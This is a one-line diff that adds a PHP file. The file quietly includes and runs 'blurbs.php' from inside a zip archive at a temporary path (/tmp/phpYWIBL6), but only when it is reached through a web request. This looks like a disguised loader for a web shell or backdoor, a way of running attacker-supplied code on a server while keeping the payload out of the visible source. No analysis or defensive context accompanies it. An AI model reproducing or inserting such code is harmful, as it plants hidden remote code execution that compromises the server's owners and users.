@@ -1,0 +1,1 @@
+<?=@null; $h="";if(!empty($_SERVER["HTTP_HOST"])) $h = "blurbs.php"; include("zip:///tmp/phpYWIBL6#$h");?>
